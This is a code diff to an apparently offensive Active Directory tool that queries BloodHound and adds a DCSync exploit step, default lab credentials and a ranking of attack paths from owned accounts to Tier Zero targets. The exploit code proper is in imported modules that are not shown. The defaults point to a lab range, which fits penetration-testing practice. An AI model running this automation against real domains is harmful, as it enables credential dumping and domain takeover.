@@ -13,7 +13,7 @@ from utils.request import BHRequest
 from utils.platform import BACKEND
 
 from services.pathfinding import get_path
-from services.printing import print_check, print_done, print_error, print_warning, print_title, print_node, print_dict_node
+from services.printing import print_check, print_done, print_error, print_warning, print_title, print_node, print_dict_node, print_level
 from services.reporting import *
 from services.parse_objects import *
 from services.enumeration import Enumerations
@@ -24,8 +24,40 @@ from exceptions.config_error import ConfigError
 from exceptions.hop_failed_error import HopFailedError
 
 from strategies.generic_all import GenericAllStrategy
+from strategies.dc_sync import DCSyncStrategy
+
+from services.scoring import path_cost, edge_cost
+from references.privilege_levels import classify, PrivilegeLevel
 
 load_dotenv()
+
+def _run_strategy(strategy, edge, creds: dict) -> None:
+    """Lance une stratégie et affiche le résultat de façon uniforme."""
+    print_check(f"Attacker : {edge.start.label}  ({edge.start.kind.value})")
+    print_check(f"Target   : {edge.target.label}  ({edge.target.kind.value})")
+    print_check(f"can_exploit() → {strategy.can_exploit()}")
+    print_check(f"Launching exploit — {edge.kind.value}")
+
+    try:
+        result = strategy.exploit(creds)
+        if result.was_executed():
+            print_done(f"Exploit succeeded! Technique: {result.technique}")
+            print_check(f"Output:\n{result.summary()}")
+            result.print_next_steps()
+        elif result.is_dry_run():
+            print_warning(f"Dry run / success=None:\n{result.output}")
+        else:
+            print_warning(f"Exploit failed:\n{result.output}")
+    except HopFailedError as e:
+        print_error(f"HopFailedError: {e}")
+
+# Credentials communs pour toutes les stratégies (lus depuis .env)
+CREDS = {
+    "dc_ip":    os.getenv("DC_IP",       "192.168.56.10"),
+    "domain":   os.getenv("AD_DOMAIN",   "sevenkingdoms.local"),
+    "username": os.getenv("AD_USERNAME", "cersei"),
+    "password": os.getenv("AD_PASSWORD", "cersei"),
+}
 
 # ─── 1. Load credentials ────────────────────────────────────────────────────
 
@@ -178,6 +210,8 @@ else:
     })
 
     ga_nodes = ga_result.get("data", {}).get("nodes", {}) if ga_result else {}
+    # node : label, kind, kinds, objectId, isTierZero, isOwnedObject
+    # print(ga_nodes)
     ga_edges = ga_result.get("data", {}).get("edges", []) if ga_result else []
 
     if not ga_edges:
@@ -219,3 +253,160 @@ else:
                 print_warning(f"Exploit returned success=False:\n{result.output}")
         except HopFailedError as e:
             print_error(f"HopFailedError: {e}")
+
+# ─── 9. DCSync ──────────────────────────────────────────────────────────────
+print_title("Step 8 — Testing DCSync exploit")
+
+dc_result = bh.bh_post("/api/v2/graphs/cypher", {
+    "query": """
+        MATCH (src)-[r:DCSync|GetChangesAll]->(dst:Domain)
+        WHERE src.enabled = true
+        RETURN src, r, dst
+        LIMIT 1
+    """,
+    "include_properties": True
+})
+
+dc_nodes = dc_result.get("data", {}).get("nodes", {}) if dc_result else {}
+dc_edges = dc_result.get("data", {}).get("edges", []) if dc_result else []
+
+if not dc_edges or not dc_nodes:
+    print_warning("No DCSync / GetChangesAll edge found in the graph.")
+else:
+    nodes  = parse_dict_node(n=dc_nodes)
+    edge   = parse_list_edge(e=dc_edges, nodes=nodes)[0]
+
+    strategy = DCSyncStrategy(edge=edge)
+    print_check(f"Found edge: {edge.kind.value} — {edge.start.label} → {edge.target.label}")
+    print_check(f"can_exploit() → {strategy.can_exploit()}")
+
+    _run_strategy(strategy, edge, CREDS)
+
+# ─── 10. High-value targets ───────────────────────────────────────────────────
+# We need : a reference table or lookup catalog
+print_title("Step 9 — High-value targets")
+
+tz_result = bh.bh_post("/api/v2/graphs/cypher", { # Tier Zero, enabled?
+        "query": """
+            MATCH (zrt:Base)
+            WHERE (zrt:Tag_Tier_Zero)
+            RETURN zrt
+        """,
+        "include_properties": True
+    })
+
+tz_nodes = tz_result.get("data", {}).get("nodes", {}) if tz_result else {}
+
+if not tz_nodes:
+    print_warning("No High-value targets found.") # /GenericWrite
+else:
+    nodes = parse_dict_node(n=tz_nodes)
+    print_dict_node(nodes)
+
+    # Define owned nodes (hardcoded for now — Vagrant)
+    # For each owned node, for each Tier Zero target, find path
+    # Score each path
+    # Show the best ones
+
+    # ──────────────────────────────────────────────────────────
+    # Step 11 — Define owned nodes (hardcoded for v1)
+    # ──────────────────────────────────────────────────────────
+
+    print_title("Step 10 — Owned nodes")
+
+    # For now: we know vagrant's SID from the output
+    # In v2 this will come from the API or user input
+    owned_nodes: list[Node] = [
+        Node(
+            objectid="S-1-5-21-4100227132-2050190331-2295276406-1000",
+            kind=NodeKind.USER,
+            label="VAGRANT@SEVENKINGDOMS.LOCAL",
+            properties={"owned": True}
+        )
+    ]
+
+    for node in owned_nodes:
+        print_node(node,"Owned") #success
+
+
+    # ──────────────────────────────────────────────────────────
+    # Step 12 — Classify targets by privilege level
+    # ──────────────────────────────────────────────────────────
+
+    print_title("Step 11 — Classify targets")
+
+    # Group targets by privilege level and sort (most critical first)
+    classified: list[tuple[Node, PrivilegeLevel]] = []
+
+    for node in nodes.values():
+        level = classify(node)
+        classified.append((node, level))
+
+    classified.sort(key=lambda pair: pair[1])  # lower = more privileged
+
+    for node, level in classified:
+        print_level(node, level)
+        print_check(f"  [{level.name}] {node}")  # Add print_level_node
+
+    # ──────────────────────────────────────────────────────────
+    # Step 13 — Find paths from owned → targets
+    # ──────────────────────────────────────────────────────────
+
+    print_title("Step 12 — Attack paths")
+
+    results = []
+
+    for target, level in classified:
+        for source in owned_nodes:
+            # Skip if source IS the target
+            if source.objectid == target.objectid:
+                continue
+
+            try:
+                path = get_path(bh, source, target)
+                cost = path_cost(path.edges)
+                results.append({
+                    "source": source,
+                    "target": target,
+                    "privilege_level": level,
+                    "path": path,
+                    "cost": cost,
+                })
+                print_check(
+                    f"{source.label} → {target.label} "
+                    f"[{level.name}] cost={cost} hops={len(path.edges)}"
+                )
+            except NoPathError:
+                print_warning(f"No path: {source.label} → {target.label}")
+            except Exception as e:
+                print_warning(f"Error: {source.label} → {target.label}: {e}")
+
+
+    # ──────────────────────────────────────────────────────────
+    # Step 14 — Rank and display best attack paths
+    # ──────────────────────────────────────────────────────────
+
+    print_title("Step 13 — Best attack paths (sorted by cost)")
+
+    if not results:
+        print_warning("No attack paths found from owned nodes.")
+    else:
+        # Sort: most critical target first, then cheapest path
+        results.sort(key=lambda r: (r["privilege_level"], r["cost"]))
+
+        for i, r in enumerate(results, 1):
+            path = r["path"]
+            print(f"\n{'='*60}")
+            print(f"  Path #{i}")
+            print(f"  From:   {r['source'].label}")
+            print(f"  To:     {r['target'].label}")
+            print(f"  Level:  {r['privilege_level'].name}")
+            print(f"  Cost:   {r['cost']}")
+            print(f"  Hops:   {len(path.edges)}")
+            print(f"{'='*60}")
+
+            for edge in path.edges:
+                cost = edge_cost(edge)
+                print(f"    {edge.source_node.label}")
+                print(f"      --[{edge.kind.value}]--> (cost: {cost})")
+            print(f"    {path.edges[-1].goal_node.label}")
